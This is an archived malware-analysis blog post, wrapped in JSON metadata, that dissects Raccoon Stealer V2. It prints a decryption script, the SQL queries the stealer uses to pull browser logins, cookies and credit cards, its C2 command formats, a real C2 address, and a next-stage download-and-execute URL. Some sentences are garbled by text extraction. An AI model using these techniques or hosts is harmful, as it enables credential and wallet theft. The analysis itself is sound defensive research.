{
    "id": "4a672da8-51d2-451a-81c2-1ae60831e57c",
    "created_at": "2023-01-12T15:07:06.566535Z",
    "updated_at": "2025-03-27T02:05:52.727872Z",
    "deleted_at": null,
    "sha1_hash": "8d4fcb690be4ee761398f567a4c4cef6eaf77423",
    "title": "2022-09-12 - Raccoon Stealer V2 in depth Analysis",
    "authors": "",
    "file_creation_date": "2022-10-02T12:03:39Z",
    "file_modification_date": "2022-10-02T12:03:39Z",
    "file_size": 979268,
    "plain_text": "# Raccoon Stealer\n\n**d01a.github.io/raccoon-stealer/**\n\nMohamed Adel September 12, 2022\n\n## Contents\n\n[Mohamed Adel included in Malware Analysis](https://d01a.github.io/)\n2022-09-12 2371 words\n 12 minutes\n views\n\n## Conclusion\n\nRaccoon Stealer V2 (or RecordBreaker) Is a stealer that provided as a service with about 200$/m. It is a new version of Raccoon stealer that\nappeared in 2019 and died for a while then it returns with this new Stealer which known as RecordBreaker.\n\nIt Comes with a lot of capabilities, It can grab a lot of sensitive information like :\n\n1. Steal Victim System information\n2. Steal Victim Username and passwords stored in the browser\n3. Steal Victim Browser’s Autofill Information\n4. Steal Credit Card information\n5. Steal Crypto wallets Information\n6. Steal Bitcoin Wallets\n7. Grab any file from the victim system\n8. Take Screenshots from the victim system\n9. Load next stage\n\n## Analysis\n\n### First Look\n\nFirst we start with basic analysis, using Detect it easy we see that the file seems to be not packed. Exploring the strings tab, we see a lot of\nbase64 encoded strings and two registry keys `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall and`\n```\nSOFTWARE\\Microsoft\\Cryptography\n\n```\n\n-----\n\nStrings\n\ntrying to encode the base64 strings will produce encrypted data so i think thats all with basic insights about the executable and lets upload the\nsample to IDA (and ghidra for decompiling)\n\n### Dynamically resolving DLLs and APIs\n\nIn the entry function we see two function calls at the very beginning to `sub_401000 and` `sub_404036 . by navigating to` `sub_401000 we`\nsee that this function resolve the required APIs\n\ndll loaded\n\n### Decrypting the encrypted data\n\nAfter going back to to the entry function, After resolving the APIs there is another function call `sub_404036 . This function takes a pattern that`\nseems to be decrypting the data. The sequence is a call to `sub_00401806 that calls` `CryptStringToBinaryA after calling` `LstrLenA . The`\ncall to `CryptStringToBinaryA takes a the` `dwFlags parameter` `0x00000001 (CRYPT_STRING_BASE64) which decode the string using`\nbase64 encoding routine and returns a byte array contains the base64-decoded encrypted data.\n\n\n-----\n\ndecrypt\n\nafter decrypting the string there are calls to `sub_0040A59A function that convert the resulting strings to unicode strings by calling`\n```\nMultiByteToWideChar\n\n```\n\nto get all the decrypted strings we can use the debugger or by making a script to decrypt them for us\n```\n  import base64\n\n  from Crypto.Cipher import ARC4\n\n  strings = [ \n  'fVQMox8c','bE8Yjg==','bkoJoy0=','LEtihSAW6eunMDV+Aes3rVhAClFoaQM=',...,'59c9737264c0b3209d9193b8ded6c127','XVHmGYV5cH1pvOC0w/cmant\n  w==']\n\n  key = \"edinayarossiya\".encode('utf-8')\n\n  for i in strings:\n\n       cipher = ARC4.new(key)\n\n       print(cipher.decrypt(base64.b64decode(i.encode('utf-8'))))\n\n\n```\nthe decrypted strings:\n```\n  tlgrm_\n\n  ews_\n\n  grbr_\n\n  %s\\tTRUE\\t%s\\t%s\\t%s\\t%s\\t%s\\n\n\n  URL:%s\\nUSR:%s\\nPASS:%s\\n\n\n  \\t\\t%d) %s\\n\n\n  \\t- Locale: %s\\n\n\n  \\t- OS: %s\\n\n\n  \\t- RAM: %d MB\\n\n\n  \\t- Time zone: %c%ld minutes from GMT\\n\n\n  \\t- Display size: %dx%d\\n\n\n  \\t- Architecture: x%d\\n\n\n  \\t- CPU: %s (%d cores)\\n\n\n  \\t- Display Devices:\\n%s\\n\n\n  formhistory.sqlite\n\n  logins.json\n\n  \\\\autofill.txt\n\n  \\\\cookies.txt\n\n  \\\\passwords.txt\n\n  Content-Type: application/x-www-form-urlencoded; charset=utf-8\n\n  Content-Type: multipart/form-data; boundary=\n\n  Content-Type: text/plain;\n\n  User Data\n\n  wallets\n\n  wlts_\n\n  ldr_\n\n  scrnsht\n\n```\n\n-----\n\n```\ntoken:\n\nnss3.dll\n\nsqlite3.dll\n\nSOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\n\nPATH\n\nProductName\n\nWeb Data\n\nsqlite3_prepare_v2\n\nsqlite3_open16\n\nsqlite3_close\n\nsqlite3_step\n\nsqlite3_finalize\n\nsqlite3_column_text16\n\nsqlite3_column_bytes16\n\nsqlite3_column_blob\n\nSELECT origin_url, username_value, password_value FROM logins\n\nSELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM cookies\n\nSELECT name, value FROM autofill\n\npera\n\nStable\n\nSELECT host, path, isSecure, expiry, name, value FROM moz_cookies\n\nSELECT fieldname, value FROM moz_formhistory\n\ncookies.sqlite\n\nmachineId=\n\n&configId=\n\n\"encrypted_key\":\"\n\nstats_version\":\"\n\nContent-Type: application/x-object\n\nContent-Disposition: form-data; name=\"file\"; filename=\"\n\nPOST\n\nMachineGuid\n\nimage/jpeg\n\nGdiPlus.dll\n\nGdi32.dll\n\nGdiplusStartup\n\nGdipDisposeImage\n\nGdipGetImageEncoders\n\nGdipGetImageEncodersSize\n\nGdipCreateBitmapFromHBITMAP\n\nGdipSaveImageToFile\n\nBitBlt\n\nCreateCompatibleBitmap\n\nCreateCompatibleDC\n\nDeleteObject\n\nGetObjectW\n\nSelectObject\n\nSetStretchBltMode\n\nStretchBlt\n\nSELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM\ncredit_cards\n\nNUM:%s\\nHOLDER:%s\\nEXP:%s/%s\\n\n\n\\\\CC.txt\n\nNSS_Init\n\nNSS_Shutdown\n\nPK11_GetInternalKeySlot\n\nPK11_FreeSlot\n\nPK11_Authenticate\n\nPK11SDR_Decrypt\n\nSECITEM_FreeItem\n\nhostname\":\"\n\n\",\"httpRealm\":\n\nencryptedUsername\":\"\n\n\",\"encryptedPassword\":\"\n\n\",\"guid\":\n\nProfiles\n\nb\"\\xee\\xefV>\\x0c\\xb5Ge\\xb6,A\\xef\\x87=g)'\\x99\\x0c\\xbf7iT\\xfd\"\n\nb'Ti\\x8d\\xc8\\xf7:\\xdc\\x9f\\xeb\\xff\\xdc\\xef\\xb1\\x154\\xb4*\\x00\\x87\\xd9\\xf0q'\n\n```\n\n-----\n\n-----\n\nas we can see, the last two strings seems not to be decrypted. If we go back the `start function we see that the string`\n```\n59c9737264c0b3209d9193b8ded6c127 is a different key used to decrypt the string XVHmGYV5cH1pvOC0w/cmantl/oG9aw== and the\n\n```\ndecrypted string is\n```\n  http://51.195.166\n  .184/\n\n\n```\nthere are some other decryption routines using the same key but the strings are empty.\n\nthen, the attacker retrieves the locale name which is `<language>-<REGION> and compare it against` `ru for some reason, but the flow didn’t`\nchanged if it is!\n\n\n-----\n\nThe attacker open a mutex with a name `8724643052 and if it existed, the malware terminate itself and if it is not existed it creates a mutex`\nwith that name.\n\n### Alert the server with a new victim Info\n\nThe next call is to check if the victim running as local system by making a call to `GetTokenInformation to retrieve the token user data that`\ninclude SID and then check this SID with `S-1-5-18 to see if the user is running as a` `LocalSystem or not. If it is, the function returns 1 and`\nnot returns 0\n\n\n-----\n\nThe next few instruction retrieves a decrypted strings: `Content-Type: application/x-www-form-urlencoded; charset=utf-8 and` `*/*`\nthen calls a function that formats the input with a given pattern, This function is referenced in a lot of places in the sample.\n\nthis function format the input string with `\\r\\n appended to it and calls the function that seems to be that does the formatting procedures and`\nit’s used in so many places\n\n\n-----\n\nThen the malware make a call to a function `sub_0040A720 after allocating two regions in the memory .if we navigate to this function we see`\nthat it first reference the previously allocated memory and the open the registry key\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\ and read the value MachineGuid and returns it in EAX register\n\n```\nthen the malware retrieves the username of the current user and makes some formatting to the data before sending it. The formatted data are\nsome information about the victim machine like:\n```\n  machineId=<GUID>|<username>&confId=<predefined value>\n\n  machineId=d8874349-72d5-492c-8d8c  5e6d3a68e127|d01a&configId=59c9737264c0b3209d9193b8ded6c127\n\n```\n\n-----\n\nco g d used s t e ey used to dec ypt t e C add ess o, t e st p ece o data s eady to be se t to t e attac e a d t e u ct o\n```\nsub_004079F3 did this. First, the function references the IP of the C2 server and make some comparisons to its beginning to make sure that\n\n```\nit’s in a valid format. Then it gets a pointer to `/ at the end of the IP address and then make a call to` `InternetOpenW(\"record\",0,0,0) it`\nparameter is the User-Agent of the request sent .now it’s ready to connect to the remote server, so it connects to the remote server over http\ntransfer protocol and port 443, the default for https transfer protocol\n\nThen it sends the data to the C2 server set before. The content type sent in the request in the form `Content-Type: application/x-www-`\n```\nform-urlencoded; charset=utf-8\\r\\n\\r\\n\\r\\n and the data sent in the OptionalHeader parameter which sent after the request\n\n```\nheaders. And after sending the data it waits for a response from the server. Then it parses the response for a specific field contain the word\n```\nToken: if it found it continue running if it is not, it exits.\n\n### Install required libraries\n\n```\nIt search for the `libs word in the response in order to prepare a legitimate DLL that are required for the malware to run. the command can`\nbe in form:\n```\n  libs_nss3:http://{HOSTADDR}/{RANDOM_STRING}/nss3.dll\n\n  libs_msvcp140:http://{HOSTADDR}/{RANDOM_STRING}/msvcp140.dll\n  libs_vcruntime140:http://{HOSTADDR}/{RANDOM_STRING}/vcruntime140.dll\n\n\n### Get victim machine information\n\n```\nThen, It retrieves the path of Local AppData `C:\\Users\\d01a\\AppData\\Local by calling` `SHGetFolderPathW from the function`\n```\nsub_0040A323 and format it by adding the word Low at the end of the path\nthen it adds the path to sqlite3.dll and other downloaded DLLs to\n\n```\nthe PATH environment variables\n\n\n-----\n\nThe malware collects information about the system through the function call a `sub_004097BB, it search for the word` `sstmnfo_ in the`\nresponse of the C2 Server and the data to be collected is determined in the response, after a colon `: and a pipe` `| between the key words`\nof the data.\nThen, it begin collecting information about the system:\n\n1. The locale information\nthe data is formatted in the following format - Locale:\n\n2. Time zone information\nthe data is formatted in the form: - Time zone: <%c%ld> minutes from GMT\n\n\n-----\n\n3 OS e s o et e es t e OS e s o by ead g t e eg st y ey SO `\\` `c oso t\\` `do s` `\\Cu` `e t e s o \\` `oduct a e`\nand the data formatted in the form: - OS: <%s OS>\n\n4. system Architecture\nBy calling `GetSystemWow64DirectoryW that retrieves the path of of the system directory used by WOW64 that only`\n\nexist in x64 Architecture. The data formated in form: - Architecture: x<%d Architecture>\n\n5. RAM status\ngets the memory status by calling `GlobalMemoryStatusEx that retrieves both the virtual and physical memory usage and`\n\nformat in the form: - RAM: <%d RAM Usage> MB\n\n6. CPU specifications\nUsing instruction `cpuid to retrieve the processor specification. This instruction output depends on the value in the`\n\n`eax register. The call to` `cpuid with` `eax = 0x80000002, 0x80000003 and 0x80000004` gets Processor Brand String .Also it uses\n```\n  GetSystemInfo API to get the number of processors. And send it in the format: - CPU: <%s CPU Brand> (<%d Cores number> cores)\n\n```\n7. Display\nGet the display information by calling `GetSystemMetrics with index 0 to retrieves The width of the screen of the primary`\n\ndisplay monitor and format it in form: - Display size: <%d>x<%d>\n\n\n-----\n\n8 sp ay de ces sp ay e ces %s\n\n9. Display Name And version\nGet this information from the registry `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall And the`\n\nSpecific GUID to get the display name and version\nThen it generate a random value and append it to the content-Type header and save\nthe data to a file to send it to the attacker C2 server\n\nThat’s all with `sstmnfo_ expected functionality. Lets explore the rest of the capabilities of the malware.`\n\n### Steal User information saved in Browser\n\n**Chrome Based**\n\nThe malware then Loads `sqlite3.dll and call the function at` `sub_00403FAB . This function is basically allocates two regions of memory`\nand get the paths of `%AppData% and` `%LocalAppData% directories and then transfer the flow to another functions`\n\n\n-----\n\nlets explore the first function call `sub_401B13 . It recursively search for` `User Data directory and then goes to` `sub_401E26 that have all`\nthe functionality. It first start looking for `Local State file and reads it and search for` `\"encrypted_key\":\"` in it and in the same way, it did\nwith `stats_version\":\" .`\n\nThen, It starts to resolve some functions from `sqlite3.dll to use them. And get the path to` `Login Data file and copies it to another file.`\n\n\n-----\n\nIt opens a new database connection to `Login Data copied file with` `sqlite3_open function call then it execute SQL statement:`\n```\n  SELECT origin_url, username_value, password_value FROM\n  logins\n\n\n```\nto steal the saved username & password and its associated origin URL\n\nActually, To execute that SQL statement, `sqlite3_step should be called. the return value of` `sqlite3_step can be different so, it checks if`\nthe return value is 100 this means that there is another row of output is available.\nTo retrieve the content of the database a call to\n```\nsqlite3_column_bytes16 that returns the size of the data and sqlite3_column_text16 to the content as plain text\n\n```\n\n-----\n\nAfter collecting these data it format it in the following form in a file `\\passwords.txt to send it:\n URL:%s USR:%s PASS:%s\nIn the same way, It`\nget the cookies using the SQL statment:\n```\n  SELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM\n  cookies\n\n\n```\nand format it in the following form in a file `\\cookies.txt to send it:\n %s TRUE %s %s %s %s %s`\n\nIt gets the autofill content name and value pairs in the same way using the SQL query\n```\n  SELECT name, value FROM\n  autofill\n\n\n```\nand saved the data to a file `\\autofill.txt to send it.`\n\nthen, it reads the content of `Web Data file to extract Credit Card information using the SQL query:`\n```\n  SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM\n  credit_cards\n\n\n```\nand format in the following form in a file `\\CC.txt to send it:\n NUM:%s HOLDER:%s EXP:%s/%s\nand it did the whole thing with the files in`\n```\nDefault path for the browser\n\n```\n**FireFox**\n\nFireFox Browsers are a little bit different so, it collects the data from it but needs to do different steps.\nFirst it goes to Profiles and search for\n```\ncookies.sqlite and it opens it using sqlite3 and get the cookies using SQL query:\n  SELECT host, path, isSecure, expiry, name, value FROM\n  moz_cookies\n\n\n```\nthen, The login information from `logins.json and dumping the passwords using` `PK11SDR_Decrypt function call.`\n\nThen, it goes to `formhistory.sqlite to get the Autofill information using SQL query:`\n```\n  SELECT fieldname, value FROM\n  moz_formhistory\n\n\n### Steal Crypto wallets information\n\n```\n\n-----\n\nt e espo se as t e o d `ts_ t e, t e` a a e t es to co ect a c ypto a ets o at o o t e ct as ca y t a gate a t e\nfile system searching for a pattern. And in the same way, It navigate the whole system searching for `wallet.dat which is a bitcoin wallet.`\nand if it found, sends it to the server.\n\nResponse be like:\n```\n  wlts_exodus:Exodus;26;exodus;*;*partitio*,*cache*,*dicti\n  onar*\n\n  wlts_atomic:Atomic;26;atomic;*;*cache*,*IndexedDB*\n\n  wlts_jaxxl:JaxxLiberty;26;com.liberty.jaxx;*;*cache*\n\n\n### grabbing Files\n\n```\nIf the response has the word `grbr_ search for the specified file in the system and upload it to the attacker.\nthe response be like:`\n```\n  grbr_dekstop:%USERPROFILE%\\Desktop\\|*.txt, *.doc, *pdf*|  |5|1|0|files\n\n  grbr_documents:%USERPROFILE%\\Documents\\|*.txt, *.doc, *pdf*|  |5|1|0|files\n\n  grbr_downloads:%USERPROFILE%\\Downloads\\|*.txt, *.doc, *pdf*|  |5|1|0|files\n\n\n### Telegram connection\n\n```\nThe malware can collect Telegram Desktop application data if the response has the word `tlgrm_ .`\n```\n  tlgrm_Telegram:Telegram\n  Desktop\\tdata|*|*emoji*,*user_data*,*tdummy*,*dumps*\n\n\n```\nIt search for a file specified in the response from the server and navigate to it and copy it to send to the attacker.\n\n\n-----\n\n### Take screenshot\n\nTo take a screenshot the response should have the word `scrnsht_ . First, It resolves APIs from` `GdiPlus.dll and Gdi32.dll to take a`\nscreenshot.\n\n\n-----\n\nAll APIs resolved:\n```\n   GdiplusStartup\n\n   GdipDisposeImage\n\n   GdipGetImageEncoders\n\n  GdipGetImageEncodersSize\n\n  GdipCreateBitmapFromHBIT\n  MAP\n\n   GdipSaveImageToFile\n\n   BitBlt\n\n   CreateCompatibleBitmap\n\n   CreateCompatibleDC\n\n   DeleteObject\n\n   GetObjectW\n\n   SelectObject\n\n   SetStretchBltMode\n\n   StretchBlt\n\n   DC\n\n\n```\nThe malware uses these APIs to take a screenshots from the victim system and send them to the attacker\n\n\n-----\n\n### Loading Next stage\n\nThe malware can drop a next stage malware specified in the response from the server containing `ldr_ .`\n```\n  ldr_1:http://94.158.244.119/U4N9B5X5F5K2A0L4L4T5/84897964387342609301.bin|%TEMP%\n  \\|exe\n\n\n```\nThe malware open a connection to the server and download the content of the file specified in the response to the system\n\nThe malware then execute the downloaded file using `ShellExecute API call`\n\nThat’s all, The malware clear the files that created and release the allocated memory regions\n\n\n-----\n\n## IOCs:\n\nsha256: 022432f770bf0e7c5260100fcde2ec7c49f68716751fd7d8b9e113bf06167e03\n51.195.166[.]184\n\n## References\n\nUpdated on 2022-09-13 [30d80d1](https://github.com/dillonzq/LoveIt/commit/30d80d13757ac89f3e5ec4b0e43ff3ad2b865fd7)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-12 - Raccoon Stealer V2 in depth Analysis.pdf"
    ],
    "report_names": [
        "2022-09-12 - Raccoon Stealer V2 in depth Analysis.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536026,
    "ts_updated_at": 1743041152,
    "ts_creation_date": 1664712219,
    "ts_modification_date": 1664712219,
    "files": {
        "pdf": "https://archive.orkl.eu/8d4fcb690be4ee761398f567a4c4cef6eaf77423.pdf",
        "text": "https://archive.orkl.eu/8d4fcb690be4ee761398f567a4c4cef6eaf77423.txt",
        "img": "https://archive.orkl.eu/8d4fcb690be4ee761398f567a4c4cef6eaf77423.jpg"
    }
}